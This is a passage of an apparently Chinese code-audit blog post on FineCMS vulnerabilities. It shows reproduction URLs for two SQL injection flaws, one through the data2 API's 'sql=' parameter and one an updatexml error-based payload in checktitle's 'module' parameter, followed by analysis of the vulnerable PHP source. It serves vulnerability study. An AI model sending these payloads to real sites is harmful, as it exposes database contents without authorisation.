            <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;&#39;</span>;
        }
        $string <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>;
        <span style="color:#66d9ef">foreach</span> ($array <span style="color:#66d9ef">as</span> $var) {
            $var <span style="color:#f92672">=</span> <span style="color:#a6e22e">dr_safe_replace</span>($var);
            $string<span style="color:#f92672">.=</span> <span style="color:#e6db74">&#39;[&#39;</span>;
            <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">strpos</span>($var, <span style="color:#e6db74">&#39;$&#39;</span>) <span style="color:#f92672">===</span> <span style="color:#ae81ff">0</span>) {
                $string<span style="color:#f92672">.=</span> <span style="color:#a6e22e">preg_replace</span>(<span style="color:#e6db74">&#39;/\[(.+)\]/U&#39;</span>, <span style="color:#e6db74">&#39;[\&#39;\\1\&#39;]&#39;</span>, $var);
            } <span style="color:#66d9ef">elseif</span> (<span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#39;/[A-Z_]+/&#39;</span>, $var)) {
                $string<span style="color:#f92672">.=</span> <span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>$var<span style="color:#f92672">.</span><span style="color:#e6db74">&#39;&#39;</span>;
            } <span style="color:#66d9ef">else</span> {
                $string<span style="color:#f92672">.=</span> <span style="color:#e6db74">&#39;\&#39;&#39;</span><span style="color:#f92672">.</span>$var<span style="color:#f92672">.</span><span style="color:#e6db74">&#39;\&#39;&#39;</span>;
            }
            $string<span style="color:#f92672">.=</span> <span style="color:#e6db74">&#39;]&#39;</span>;
        }

        <span style="color:#66d9ef">return</span> $string;
    }
</code></pre></div><p><code>dr_safe_replace()</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">dr_safe_replace</span>($string) {
    $string <span style="color:#f92672">=</span> <span style="color:#a6e22e">str_replace</span>(<span style="color:#e6db74">&#39;%20&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>, $string);
    $string <span style="color:#f92672">=</span> <span style="color:#a6e22e">str_replace</span>(<span style="color:#e6db74">&#39;%27&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>, $string);
    $string <span style="color:#f92672">=</span> <span style="color:#a6e22e">str_replace</span>(<span style="color:#e6db74">&#39;%2527&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>, $string);
    $string <span style="color:#f92672">=</span> <span style="color:#a6e22e">str_replace</span>(<span style="color:#e6db74">&#39;*&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>, $string);
    $string <span style="color:#f92672">=</span> <span style="color:#a6e22e">str_replace</span>(<span style="color:#e6db74">&#39;&#34;&#39;</span>, <span style="color:#e6db74">&#39;&amp;quot;&#39;</span>, $string);
    $string <span style="color:#f92672">=</span> <span style="color:#a6e22e">str_replace</span>(<span style="color:#e6db74">&#34;&#39;&#34;</span>, <span style="color:#e6db74">&#39;&#39;</span>, $string);
    $string <span style="color:#f92672">=</span> <span style="color:#a6e22e">str_replace</span>(<span style="color:#e6db74">&#39;&#34;&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>, $string);
    $string <span style="color:#f92672">=</span> <span style="color:#a6e22e">str_replace</span>(<span style="color:#e6db74">&#39;;&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>, $string);
    $string <span style="color:#f92672">=</span> <span style="color:#a6e22e">str_replace</span>(<span style="color:#e6db74">&#39;&lt;&#39;</span>, <span style="color:#e6db74">&#39;&amp;lt;&#39;</span>, $string);
    $string <span style="color:#f92672">=</span> <span style="color:#a6e22e">str_replace</span>(<span style="color:#e6db74">&#39;&gt;&#39;</span>, <span style="color:#e6db74">&#39;&amp;gt;&#39;</span>, $string);
    $string <span style="color:#f92672">=</span> <span style="color:#a6e22e">str_replace</span>(<span style="color:#e6db74">&#34;{&#34;</span>, <span style="color:#e6db74">&#39;&#39;</span>, $string);
    $string <span style="color:#f92672">=</span> <span style="color:#a6e22e">str_replace</span>(<span style="color:#e6db74">&#39;}&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>, $string);
    <span style="color:#66d9ef">return</span> $string;
}

</code></pre></div><h1 id="0x05-任意sql语句执行1">0x05 任意SQL语句执行1</h1>
<h2 id="1漏洞复现-2">1.漏洞复现</h2>
<p>浏览器：</p>
<p><code>http://getpass1.cn/index.php?c=api&amp;m=data2&amp;auth=582f27d140497a9d8f048ca085b111df&amp;param=action=sql%20sql=%27select%20version();%27</code></p>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/finecms11/7.png" alt=""></p>
<h2 id="2漏洞分析-2">2.漏洞分析</h2>
<p>这里就不用debug模式去跟进了，有不懂CI框架的数据库操作可以去看官方文档http://codeigniter.org.cn/user_guide/database/index.html</p>
<p>问题一样出在<code>finecms/dayrui/controllers/Api.php</code>中的<code>data2()</code>,可以直接去看<code>finecms/dayrui/libraries/Template.php</code>里面的<code>list_tag()</code>函数</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">  <span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#39;sql&#39;</span><span style="color:#f92672">:</span> <span style="color:#75715e">// 直接sql查询
</span><span style="color:#75715e"></span>
                <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#39;/sql=\&#39;(.+)\&#39;/sU&#39;</span>, $_params, $sql)) {


                    <span style="color:#75715e">// 数据源的选择
</span><span style="color:#75715e"></span>                    $db <span style="color:#f92672">=</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">ci</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">db</span>;

                    <span style="color:#75715e">// 替换前缀
</span><span style="color:#75715e"></span>                    $sql <span style="color:#f92672">=</span> <span style="color:#a6e22e">str_replace</span>(
                        <span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#39;@#S&#39;</span>, <span style="color:#e6db74">&#39;@#&#39;</span>),
                        <span style="color:#66d9ef">array</span>($db<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">dbprefix</span><span style="color:#f92672">.</span>$system[<span style="color:#e6db74">&#39;site&#39;</span>], $db<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">dbprefix</span>),
                        <span style="color:#a6e22e">trim</span>(<span style="color:#a6e22e">urldecode</span>($sql[<span style="color:#ae81ff">1</span>]))
                    );
                    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">stripos</span>($sql, <span style="color:#e6db74">&#39;SELECT&#39;</span>) <span style="color:#f92672">!==</span> <span style="color:#ae81ff">0</span>) {
                        <span style="color:#66d9ef">return</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">_return</span>($system[<span style="color:#e6db74">&#39;return&#39;</span>], <span style="color:#e6db74">&#39;SQL语句只能是SELECT查询语句&#39;</span>);
                    }

                    $total <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
                    $pages <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>;

                    <span style="color:#75715e">// 如存在分页条件才进行分页查询
</span><span style="color:#75715e"></span>                    <span style="color:#66d9ef">if</span> ($system[<span style="color:#e6db74">&#39;page&#39;</span>] <span style="color:#f92672">&amp;&amp;</span> $system[<span style="color:#e6db74">&#39;urlrule&#39;</span>]) {
                        $page <span style="color:#f92672">=</span> <span style="color:#a6e22e">max</span>(<span style="color:#ae81ff">1</span>, (<span style="color:#a6e22e">int</span>)$_GET[<span style="color:#e6db74">&#39;page&#39;</span>]);
                        $row <span style="color:#f92672">=</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">_query</span>(<span style="color:#a6e22e">preg_replace</span>(<span style="color:#e6db74">&#39;/select \* from/iUs&#39;</span>, <span style="color:#e6db74">&#39;SELECT count(*) as c FROM&#39;</span>, $sql), $system[<span style="color:#e6db74">&#39;site&#39;</span>], $system[<span style="color:#e6db74">&#39;cache&#39;</span>], <span style="color:#66d9ef">FALSE</span>);
                        $total <span style="color:#f92672">=</span> (<span style="color:#a6e22e">int</span>)$row[<span style="color:#e6db74">&#39;c&#39;</span>];
                        $pagesize <span style="color:#f92672">=</span> $system[<span style="color:#e6db74">&#39;pagesize&#39;</span>] <span style="color:#f92672">?</span> $system[<span style="color:#e6db74">&#39;pagesize&#39;</span>] <span style="color:#f92672">:</span> <span style="color:#ae81ff">10</span>;
                        <span style="color:#75715e">// 没有数据时返回空
</span><span style="color:#75715e"></span>                        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>$total) {
                            <span style="color:#66d9ef">return</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">_return</span>($system[<span style="color:#e6db74">&#39;return&#39;</span>], <span style="color:#e6db74">&#39;没有查询到内容&#39;</span>, $sql, <span style="color:#ae81ff">0</span>);
                        }
                        $sql<span style="color:#f92672">.=</span> <span style="color:#e6db74">&#39; LIMIT &#39;</span><span style="color:#f92672">.</span>$pagesize <span style="color:#f92672">*</span> ($page <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>)<span style="color:#f92672">.</span><span style="color:#e6db74">&#39;,&#39;</span><span style="color:#f92672">.</span>$pagesize;
                        $pages <span style="color:#f92672">=</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">_get_pagination</span>(<span style="color:#a6e22e">str_replace</span>(<span style="color:#e6db74">&#39;[page]&#39;</span>, <span style="color:#e6db74">&#39;{page}&#39;</span>, <span style="color:#a6e22e">urldecode</span>($system[<span style="color:#e6db74">&#39;urlrule&#39;</span>])), $pagesize, $total);
                    }

                    $data <span style="color:#f92672">=</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">_query</span>($sql, $system[<span style="color:#e6db74">&#39;site&#39;</span>], $system[<span style="color:#e6db74">&#39;cache&#39;</span>]);
                    $fields <span style="color:#f92672">=</span> <span style="color:#66d9ef">NULL</span>;

                    <span style="color:#66d9ef">if</span> ($system[<span style="color:#e6db74">&#39;module&#39;</span>]) {
                        $fields <span style="color:#f92672">=</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">ci</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">module</span>[$system[<span style="color:#e6db74">&#39;module&#39;</span>]][<span style="color:#e6db74">&#39;field&#39;</span>]; <span style="color:#75715e">// 模型主表的字段
</span><span style="color:#75715e"></span>                    }

                    <span style="color:#66d9ef">if</span> ($fields) {
                        <span style="color:#75715e">// 缓存查询结果
</span><span style="color:#75715e"></span>                        $name <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;list-action-sql-&#39;</span><span style="color:#f92672">.</span><span style="color:#a6e22e">md5</span>($sql);
                        $cache <span style="color:#f92672">=</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">ci</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">get_cache_data</span>($name);
                        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>$cache <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">is_array</span>($data)) {
                            <span style="color:#75715e">// 模型表的系统字段
</span><span style="color:#75715e"></span>                            $fields[<span style="color:#e6db74">&#39;inputtime&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#39;fieldtype&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;Date&#39;</span>);
                            $fields[<span style="color:#e6db74">&#39;updatetime&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#39;fieldtype&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;Date&#39;</span>);
                            <span style="color:#75715e">// 格式化显示自定义字段内容
</span><span style="color:#75715e"></span>                            <span style="color:#66d9ef">foreach</span> ($data <span style="color:#66d9ef">as</span> $i <span style="color:#f92672">=&gt;</span> $t) {
                                $data[$i] <span style="color:#f92672">=</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">ci</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">field_format_value</span>($fields, $t, <span style="color:#ae81ff">1</span>);
                            }
                            <span style="color:#75715e">//$cache = $this-&gt;ci-&gt;set_cache_data($name, $data, $system[&#39;cache&#39;]);
</span><span style="color:#75715e"></span>                            $cache <span style="color:#f92672">=</span> $system[<span style="color:#e6db74">&#39;cache&#39;</span>] <span style="color:#f92672">?</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">ci</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">set_cache_data</span>($name, $data, $system[<span style="color:#e6db74">&#39;cache&#39;</span>]) <span style="color:#f92672">:</span> $data;
                        }
                        $data <span style="color:#f92672">=</span> $cache;
                    }
                    <span style="color:#66d9ef">return</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">_return</span>($system[<span style="color:#e6db74">&#39;return&#39;</span>], $data, $sql, $total, $pages, $pagesize);
                } <span style="color:#66d9ef">else</span> {
                    <span style="color:#66d9ef">return</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">_return</span>($system[<span style="color:#e6db74">&#39;return&#39;</span>], <span style="color:#e6db74">&#39;参数不正确，SQL语句必须用单引号包起来&#39;</span>); <span style="color:#75715e">// 没有查询到内容
</span><span style="color:#75715e"></span>                }
                <span style="color:#66d9ef">break</span>;
</code></pre></div><p>这里想说一下就是<code>preg_match</code>这个函数的作用，他匹配过后sql是一个数组：</p>
<pre><code>array(2) {
  [0]=&gt;
  string(23) &quot;sql='select version();'&quot;
  [1]=&gt;
  string(17) &quot;select version();&quot;
}
</code></pre><p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/finecms11/8.png" alt=""></p>
<p>这里判断了开头的位置是否只使用了<code>select</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"> <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">stripos</span>($sql, <span style="color:#e6db74">&#39;SELECT&#39;</span>) <span style="color:#f92672">!==</span> <span style="color:#ae81ff">0</span>) {
                        <span style="color:#66d9ef">return</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">_return</span>($system[<span style="color:#e6db74">&#39;return&#39;</span>], <span style="color:#e6db74">&#39;SQL语句只能是SELECT查询语句&#39;</span>);
</code></pre></div><p>再往下看，这一句才是执行SQL的地方，传入sql内容和<code>$system['site']</code>默认是<code>1</code>,<code>$system['cache']</code> 默认缓存时间是<code>3600</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"> $data <span style="color:#f92672">=</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">_query</span>($sql, $system[<span style="color:#e6db74">&#39;site&#39;</span>], $system[<span style="color:#e6db74">&#39;cache&#39;</span>]);
</code></pre></div><p>继续跟进<code>_query()</code>函数</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">_query</span>($sql, $site, $cache, $all <span style="color:#f92672">=</span> <span style="color:#66d9ef">TRUE</span>) {
        <span style="color:#66d9ef">echo</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">ci</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">site</span>[$site];
        <span style="color:#75715e">// 数据库对象
</span><span style="color:#75715e"></span>        $db <span style="color:#f92672">=</span> $site <span style="color:#f92672">?</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">ci</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">site</span>[$site] <span style="color:#f92672">:</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">ci</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">db</span>;
        $cname <span style="color:#f92672">=</span> <span style="color:#a6e22e">md5</span>($sql<span style="color:#f92672">.</span><span style="color:#a6e22e">dr_now_url</span>());
        <span style="color:#75715e">// 缓存存在时读取缓存文件
</span><span style="color:#75715e"></span>        <span style="color:#66d9ef">if</span> ($cache <span style="color:#f92672">&amp;&amp;</span> $data <span style="color:#f92672">=</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">ci</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">get_cache_data</span>($cname)) {
            <span style="color:#66d9ef">return</span> $data;
        }

        <span style="color:#75715e">// 执行SQL
</span><span style="color:#75715e"></span>        $db<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">db_debug</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">FALSE</span>;
        $query <span style="color:#f92672">=</span> $db<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">query</span>($sql);

        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>$query) {
            <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;SQL查询解析不正确：&#39;</span><span style="color:#f92672">.</span>$sql;
        }

        <span style="color:#75715e">// 查询结果
</span><span style="color:#75715e"></span>        $data <span style="color:#f92672">=</span> $all <span style="color:#f92672">?</span> $query<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">result_array</span>() <span style="color:#f92672">:</span> $query<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">row_array</span>();

        <span style="color:#75715e">// 开启缓存时，重新存储缓存数据
</span><span style="color:#75715e"></span>        $cache <span style="color:#f92672">&amp;&amp;</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">ci</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">set_cache_data</span>($cname, $data, $cache);

        $db<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">db_debug</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">TRUE</span>;
        
        <span style="color:#66d9ef">return</span> $data;
    }
</code></pre></div><p>没有对函数进行任何过滤<code>     $query = $db-&gt;query($sql);</code>，直接带入了我们的语句。</p>
<p>官方的修复方法：删除了<code>data2()</code>函数</p>
<h1 id="0x06-任意sql语句执行2">0x06 任意SQL语句执行2</h1>
<h2 id="1漏洞复现-3">1.漏洞复现</h2>
<p>浏览器：</p>
<p><code>http://getpass1.cn/index.php?s=member&amp;c=api&amp;m=checktitle&amp;id=1&amp;title=1&amp;module=news,(select%20(updatexml(1,concat(1,(select%20user()),0x7e),1)))a</code></p>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/finecms11/9.png" alt=""></p>
<h2 id="2-漏洞分析">2. 漏洞分析</h2>
<p>文件在<code>finecms/dayrui/controllers/member/Api.php</code>的<code>checktitle()</code>函数</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">checktitle</span>() {

        $id <span style="color:#f92672">=</span> (<span style="color:#a6e22e">int</span>)$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">input</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;id&#39;</span>);
        $title <span style="color:#f92672">=</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">input</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;title&#39;</span>, <span style="color:#66d9ef">TRUE</span>);
        $module <span style="color:#f92672">=</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">input</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;module&#39;</span>);
        
        (<span style="color:#f92672">!</span>$title <span style="color:#f92672">||</span> <span style="color:#f92672">!</span>$module) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#66d9ef">exit</span>(<span style="color:#e6db74">&#39;&#39;</span>);

        $num <span style="color:#f92672">=</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">db</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">where</span>(<span style="color:#e6db74">&#39;id&lt;&gt;&#39;</span>, $id)<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">where</span>(<span style="color:#e6db74">&#39;title&#39;</span>, $title)<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">count_all_results</span>(<span style="color:#a6e22e">SITE_ID</span><span style="color:#f92672">.</span><span style="color:#e6db74">&#39;_&#39;</span><span style="color:#f92672">.</span>$module);
        <span style="color:#66d9ef">echo</span> $num;
        $num <span style="color:#f92672">?</span> <span style="color:#66d9ef">exit</span>(<span style="color:#a6e22e">fc_lang</span>(<span style="color:#e6db74">&#39;&lt;font color=red&gt;&#39;</span><span style="color:#f92672">.</span><span style="color:#a6e22e">fc_lang</span>(<span style="color:#e6db74">&#39;重复&#39;</span>)<span style="color:#f92672">.</span><span style="color:#e6db74">&#39;&lt;/font&gt;&#39;</span>)) <span style="color:#f92672">:</span> <span style="color:#66d9ef">exit</span>(<span style="color:#e6db74">&#39;&#39;</span>);
    }
</code></pre></div><p>其他的没什么过滤，主要是CI框架里面的一些内置方法，比如<code>count_all_results</code>，可以到http://codeigniter.org.cn/user_guide/database/query_builder.html?highlight=count_all_results#CI_DB_query_builder::count_all_results  查看用法</p>
<p>还有一个就是<code>SITE_ID</code>变量，它是指</p>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/finecms11/10.png" alt=""></p>
<blockquote>
<p>站点是系统的核心部分，各个站点数据独立，可以设置站点分库管理</p>
</blockquote>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/finecms11/11.png" alt=""></p>
<p>剩下也没什么可分析了，不懂updatexml语句可以看下面的参考链接</p>
<h1 id="0x07-结束">0x07 结束</h1>
<p>还有一个远程命令执行漏洞没能复现，是在api的html()函数，说是可以用&amp;来突破,但是eval只能用<code>;</code>来结束语句的结束。</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">dr_safe_replace</span>($string) {
    $string <span style="color:#f92672">=</span> <span style="color:#a6e22e">str_replace</span>(<span style="color:#e6db74">&#39;%20&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>, $string);
    $string <span style="color:#f92672">=</span> <span style="color:#a6e22e">str_replace</span>(<span style="color:#e6db74">&#39;%27&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>, $string);
    $string <span style="color:#f92672">=</span> <span style="color:#a6e22e">str_replace</span>(<span style="color:#e6db74">&#39;%2527&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>, $string);
    $string <span style="color:#f92672">=</span> <span style="color:#a6e22e">str_replace</span>(<span style="color:#e6db74">&#39;*&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>, $string);
    $string <span style="color:#f92672">=</span> <span style="color:#a6e22e">str_replace</span>(<span style="color:#e6db74">&#39;&#34;&#39;</span>, <span style="color:#e6db74">&#39;&amp;quot;&#39;</span>, $string);
    $string <span style="color:#f92672">=</span> <span style="color:#a6e22e">str_replace</span>(<span style="color:#e6db74">&#34;&#39;&#34;</span>, <span style="color:#e6db74">&#39;&#39;</span>, $string);
    $string <span style="color:#f92672">=</span> <span style="color:#a6e22e">str_replace</span>(<span style="color:#e6db74">&#39;&#34;&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>, $string);
    $string <span style="color:#f92672">=</span> <span style="color:#a6e22e">str_replace</span>(<span style="color:#e6db74">&#39;;&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>, $string);
    $string <span style="color:#f92672">=</span> <span style="color:#a6e22e">str_replace</span>(<span style="color:#e6db74">&#39;&lt;&#39;</span>, <span style="color:#e6db74">&#39;&amp;lt;&#39;</span>, $string);
    $string <span style="color:#f92672">=</span> <span style="color:#a6e22e">str_replace</span>(<span style="color:#e6db74">&#39;&gt;&#39;</span>, <span style="color:#e6db74">&#39;&amp;gt;&#39;</span>, $string);
    $string <span style="color:#f92672">=</span> <span style="color:#a6e22e">str_replace</span>(<span style="color:#e6db74">&#34;{&#34;</span>, <span style="color:#e6db74">&#39;&#39;</span>, $string);
    $string <span style="color:#f92672">=</span> <span style="color:#a6e22e">str_replace</span>(<span style="color:#e6db74">&#39;}&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>, $string);
    <span style="color:#66d9ef">return</span> $string;
}
</code></pre></div><h1 id="0x08-参考">0x08 参考</h1>
<p><a href="https://www.t00ls.net/thread-41630-1-1.html">https://www.t00ls.net/thread-41630-1-1.html</a></p>
<p><a href="https://www.t00ls.net/viewthread.php?tid=44262">https://www.t00ls.net/viewthread.php?tid=44262</a></p>
<p><a href="http://lu4n.com/finecms-rce-0day/">http://lu4n.com/finecms-rce-0day/</a></p>
<p><a href="https://blog.csdn.net/vspiders/article/details/77430024">https://blog.csdn.net/vspiders/article/details/77430024</a></p>
<p><a href="http://www.cnblogs.com/Loofah/archive/2012/05/10/2494036.html">http://www.cnblogs.com/Loofah/archive/2012/05/10/2494036.html</a></p>
</div>
<div style="position: fixed; right:50px; max-width:255px; overflow:auto; top: 120px; width: 220px; bottom:90px">










<div class="toc">

    <div class="page-header"><strong>目录</strong></div>

    <div id="page-scrollspy" class="toc-nav">

        
        
            
                
                
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#0x01-%e5%89%8d%e8%a8%80">
                            0x01 前言
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#0x02-%e7%8e%af%e5%a2%83%e6%90%ad%e5%bb%ba">
                            0x02 环境搭建
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#0x03-%e4%bb%bb%e6%84%8f%e6%96%87%e4%bb%b6%e4%b8%8a%e4%bc%a0%e6%bc%8f%e6%b4%9e">
                            0x03 任意文件上传漏洞
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#1%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0">
                            1.漏洞复现
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#2%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90">
                            2.漏洞分析
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#0x04-%e4%bb%bb%e6%84%8f%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e">
                            0x04 任意代码执行漏洞
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#1%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0-1">
                            1.漏洞复现
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#2%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90-1">
                            2.漏洞分析
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#0x05-%e4%bb%bb%e6%84%8fsql%e8%af%ad%e5%8f%a5%e6%89%a7%e8%a1%8c1">
                            0x05 任意SQL语句执行1
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#1%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0-2">
                            1.漏洞复现
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#2%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90-2">
                            2.漏洞分析
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#0x06-%e4%bb%bb%e6%84%8fsql%e8%af%ad%e5%8f%a5%e6%89%a7%e8%a1%8c2">
                            0x06 任意SQL语句执行2
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    <ul class="nav">
